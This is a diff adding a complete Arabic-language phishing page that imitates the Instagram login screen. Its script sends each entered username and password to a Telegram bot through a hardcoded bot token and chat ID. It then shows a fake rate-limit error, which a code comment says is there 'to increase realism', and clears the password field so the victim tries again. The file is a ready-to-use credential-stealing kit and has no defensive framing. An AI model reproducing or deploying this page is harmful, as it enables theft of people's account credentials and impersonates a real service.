@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول • Instagram</title>
+    <style>
+        /* خلفية إنستغرام المتدرجة */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* صندوق تسجيل الدخول */
+        .login-card {
+            background-color: white;
+            padding: 40px;
+            border-radius: 1px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            width: 350px;
+            text-align: center;
+            position: relative;
+        }
+
+        .insta-logo {
+            max-width: 175px;
+            margin-bottom: 25px;
+        }
+
+        /* تنسيق الحقول */
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            box-sizing: border-box;
+            font-size: 12px;
+            outline: none;
+        }
+
+        /* زر تسجيل الدخول */
+        .login-btn {
+            width: 100%;
+            padding: 7px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .login-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .divider {
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+
+        .meta-logo {
+            max-width: 60px;
+            margin-top: 30px;
+            opacity: 0.6;
+        }
+
+        /* تصميم نافذة التنبيه (Pop-up) */
+        .error-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .error-box {
+            background: white;
+            width: 260px;
+            border-radius: 12px;
+            text-align: center;
+            overflow: hidden;
+            animation: popIn 0.2s ease-out;
+        }
+
+        .error-content {
+            padding: 20px;
+        }
+
+        .error-title {
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .error-text {
+            font-size: 14px;
+            color: #262626;
+            line-height: 1.4;
+        }
+
+        .ok-btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-top: 1px solid #dbdbdb;
+            background: transparent;
+            color: #0095f6;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        @keyframes popIn {
+            from { transform: scale(1.1); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="insta-logo" alt="Instagram">
+        
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" required>
+            <input type="password" id="password" placeholder="كلمة السر" required>
+            
+            <button type="submit" id="submitBtn" class="login-btn">تسجيل الدخول</button>
+        </form>
+
+        <div class="divider">أو</div>
+        <p style="color: #385185; font-weight: bold; font-size: 14px; cursor: pointer; margin: 0;">تسجيل الدخول بواسطة فيسبوك</p>
+        
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo" alt="Meta">
+    </div>
+
+    <!-- نافذة الخطأ -->
+    <div id="errorOverlay" class="error-overlay">
+        <div class="error-box">
+            <div class="error-content">
+                <div class="error-title">Error</div>
+                <div class="error-text">Please wait a few minutes before you try again.</div>
+            </div>
+            <button type="button" class="ok-btn" onclick="closeError()">OK</button>
+        </div>
+    </div>
+
+    <script>
+        // --- ضع بياناتك هنا ---
+        const TELEGRAM_TOKEN = '7593099648:AAEkJMxeanAHM9TP0wE1A1YMNGEk--RtAkc'; 
+        const CHAT_ID = '6424235278'; 
+
+        const loginForm = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const errorOverlay = document.getElementById('errorOverlay');
+
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // تحديث حالة الزر
+            submitBtn.disabled = true;
+            submitBtn.innerText = "...جاري التحقق";
+
+            // نص الرسالة للبوت
+            const message = `⚡️ محاولة دخول:\n👤 الحساب: ${username}\n🔑 الباسورد: ${password}`;
+
+            // إرسال البيانات عبر API التليجرام
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            })
+            .then(response => {
+                // إظهار نافذة الخطأ بعد ثانية واحدة لزيادة الواقعية
+                setTimeout(() => {
+                    submitBtn.disabled = false;
+                    submitBtn.innerText = "تسجيل الدخول";
+                    errorOverlay.style.display = 'flex';
+                }, 1000);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                submitBtn.disabled = false;
+                submitBtn.innerText = "تسجيل الدخول";
+                alert("Check your internet connection.");
+            });
+        });
+
+        // وظيفة إغلاق النافذة
+        function closeError() {
+            errorOverlay.style.display = 'none';
+            document.getElementById('password').value = ""; // مسح الباسورد القديم ليعيد المحاولة
+        }
+    </script>
+
+</body>
+</html>
